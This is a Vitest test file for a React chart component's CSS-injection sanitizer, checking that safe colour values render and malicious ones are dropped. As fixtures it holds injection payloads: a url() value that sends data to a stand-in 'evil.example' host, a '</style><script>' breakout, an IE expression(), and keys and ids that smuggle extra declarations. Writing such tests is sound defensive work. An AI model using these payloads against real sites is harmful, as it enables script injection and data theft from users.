/**
 * chart.tsx CSS-injection sanitizer (audit 2026-04-19)
 *
 * The ChartStyle component emits CSS via dangerouslySetInnerHTML, so any
 * attacker-supplied value in `config.color` / `config.theme[name]` or in
 * the chart `id` / ChartConfig keys must be validated or dropped before
 * being concatenated into the inline <style> block.
 *
 * These tests render <ChartStyle> directly and inspect the resulting
 * DOM innerHTML to assert:
 *   - Safe colors are rendered.
 *   - Malicious colors are dropped.
 *   - Malicious keys / ids are dropped.
 *   - Safe values are not accidentally blocked.
 */
import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { ChartStyle } from "@/components/ui/chart";
import type { ChartConfig } from "@/components/ui/chart";

function renderStyleText(id: string, config: ChartConfig): string {
  const { container } = render(<ChartStyle id={id} config={config} />);
  const styleEl = container.querySelector("style");
  return styleEl?.innerHTML ?? "";
}

describe("ChartStyle CSS injection guard", () => {
  // ── Allow list ──────────────────────────────────────────────────────

  it("emits safe hex colors", () => {
    const css = renderStyleText("chart-x", { total: { color: "#ff0000" } });
    expect(css).toContain("--color-total: #ff0000;");
  });

  it("emits safe rgb/rgba/hsl/oklch functional notations", () => {
    const css = renderStyleText("chart-x", {
      a: { color: "rgb(255, 0, 0)" },
      b: { color: "rgba(0,0,0,0.5)" },
      c: { color: "hsl(210 100% 50%)" },
      d: { color: "oklch(0.7 0.1 210)" },
    });
    expect(css).toContain("--color-a: rgb(255, 0, 0);");
    expect(css).toContain("--color-b: rgba(0,0,0,0.5);");
    expect(css).toContain("--color-c: hsl(210 100% 50%);");
    expect(css).toContain("--color-d: oklch(0.7 0.1 210);");
  });

  it("emits safe var(--token) references", () => {
    const css = renderStyleText("chart-x", {
      brand: { color: "var(--arena-cyan)" },
    });
    expect(css).toContain("--color-brand: var(--arena-cyan);");
  });

  it("emits bare named colors (red, transparent, currentColor)", () => {
    const css = renderStyleText("chart-x", {
      a: { color: "red" },
      b: { color: "transparent" },
      c: { color: "currentColor" },
    });
    expect(css).toContain("--color-a: red;");
    expect(css).toContain("--color-b: transparent;");
    expect(css).toContain("--color-c: currentColor;");
  });

  it("handles theme-split colors (light/dark)", () => {
    const css = renderStyleText("chart-x", {
      total: { theme: { light: "#111111", dark: "#eeeeee" } },
    });
    expect(css).toContain("--color-total: #111111;");
    expect(css).toContain("--color-total: #eeeeee;");
  });

  // ── Block list ──────────────────────────────────────────────────────

  it("drops url(...) colors (exfiltration / resource load)", () => {
    const css = renderStyleText("chart-x", {
      a: { color: "#00ff00" },
      evil: { color: "url(https://evil.example/steal?x=)" },
    });
    expect(css).toContain("--color-a: #00ff00;");
    expect(css).not.toContain("url(");
    expect(css).not.toContain("evil.example");
  });

  it("drops expression(...) legacy IE CSS", () => {
    const css = renderStyleText("chart-x", {
      evil: { color: "expression(alert(1))" },
    });
    expect(css).not.toContain("expression");
    expect(css).not.toContain("alert");
  });

  it("drops values containing </style> (context break)", () => {
    const css = renderStyleText("chart-x", {
      evil: { color: "red;}</style><script>alert(1)</script>" },
    });
    expect(css).not.toContain("</style>");
    expect(css).not.toContain("script");
  });

  it("drops values containing quotes / braces (attribute-escape guard)", () => {
    const css = renderStyleText("chart-x", {
      a: { color: 'red"' },
      b: { color: "red;color:blue}" },
    });
    // The injected values themselves must not appear anywhere.
    expect(css).not.toContain('red"');
    expect(css).not.toContain("red;color:blue");
    // No --color-a / --color-b declarations should have been emitted.
    expect(css).not.toMatch(/--color-[ab]:/);
  });

  it("drops keys that are not safe CSS idents", () => {
    const css = renderStyleText("chart-x", {
      "bad key; color: red": { color: "#fff" },
      ok_key: { color: "#000" },
    });
    expect(css).not.toContain("bad key");
    expect(css).toContain("--color-ok_key: #000;");
  });

  it("drops the entire block if the chart id is not a safe CSS ident", () => {
    const css = renderStyleText("]evil; color: red", {
      total: { color: "#ffffff" },
    });
    expect(css).toBe("");
  });

  it("drops bare identifiers containing digits (not valid named colors)", () => {
    // "abc123" looks like a CSS ident but isn't a valid color name —
    // the regex demands purely-alpha bare identifiers.
    const css = renderStyleText("chart-x", {
      a: { color: "abc123" },
    });
    expect(css).not.toContain("abc123");
  });

  it("drops overly long color values (DoS / smuggling)", () => {
    const long = "#" + "f".repeat(200);
    const css = renderStyleText("chart-x", {
      a: { color: long },
    });
    expect(css).not.toContain(long);
  });

  it("drops malformed hex (too short / too long)", () => {
    const css = renderStyleText("chart-x", {
      a: { color: "#ab" },       // 2 digits — invalid
      b: { color: "#abcdefg" },  // non-hex char
    });
    expect(css).not.toContain("#ab;");
    expect(css).not.toContain("#abcdefg");
  });
});
